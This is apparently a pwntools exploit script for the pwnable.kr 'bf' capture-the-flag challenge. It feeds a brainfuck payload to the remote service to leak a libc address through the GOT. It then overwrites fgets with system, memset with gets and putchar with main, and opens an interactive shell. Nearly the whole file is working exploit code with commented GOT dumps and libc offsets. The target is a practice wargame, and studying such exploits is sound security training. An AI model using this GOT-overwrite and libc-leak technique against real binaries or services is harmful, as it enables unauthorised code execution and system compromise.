from pwn import *

context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

#s = ssh(host='pwnable.kr', port=2222, user='bf', password='guest')
#s.download_file('bf')
#s.download_file('bf')
#s.download_file('bf.c')

p = process(["nc", "pwnable.kr", "9001"])
#p = process("./bf")
#gdb.attach(p, '''
#continue
#''')
#b *0x080485dc

# start of buffer
# 0x0804a0a0

# pointer to buffer
# 0x804a080 <p>:  0x0804a09b

# GOT 0x0804a0a0 - 0x70 = putchar
# 0x804a010 <fgets@got.plt>:      0xf7e6e150      0x08048466      0xf7e6fca0      0x08048486
# 0x804a020 <strlen@got.plt>:     0xf7e8e440      0xf7e28540      0xf7e70360      0xf7f35b50
# 0x804a030 <putchar@got.plt>:    0x080484d6      0x00000000      0x00000000      0x00000000
# 0x804a040 <stdin@@GLIBC_2.0>:   0xf7fc25a0      0x00000000      0x00000000      0x00000000

# 0x804a00c <getchar@got.plt>:    0x08048446
# 0x804a010 <fgets@got.plt>:      0xf757b150
# 0x804a014 <__stack_chk_fail@got.plt>:   0x08048466
# 0x804a018 <puts@got.plt>:       0xf757cca0
# 0x804a01c <__gmon_start__@got.plt>:     0x08048486
# 0x804a020 <strlen@got.plt>:     0xf759b440
# 0x804a024 <__libc_start_main@got.plt>:  0xf7535540
# 0x804a028 <setvbuf@got.plt>:    0xf757d360
# 0x804a02c <memset@got.plt>:     0xf7642b50
# 0x804a030 <putchar@got.plt>:    0x080484d6


start  = 0x18540
system = 0x3ada0
gets   = 0x5f3e0

fgets  = 0x5e150

read_fgets = "<" * 141
read_fgets += ".<.<.<."

write_fgets = ",>,>,>,"

write_memset = ">" * 25
write_memset += ",>,>,>,"

write_putchar = ">,>,>,>,"

execute = "."

payload = read_fgets + write_fgets + write_memset + write_putchar + execute

p.recvuntil("type some brainfuck instructions except [ ]")
p.sendline(payload)

data = ""
while len(data) < 5:
    data += p.recv()

leak = u32(data.split("\n")[1], endian='big')

libc_base = leak - fgets

write_to_fgets = p32(libc_base + system)
p.send(write_to_fgets)

write_to_memset = p32(libc_base + gets)
p.send(write_to_memset)

#write_to_putchar = p32(libc_base + start)
#p.send(write_to_putchar)
main = p32(0x08048671)
p.send(main)

p.interactive()
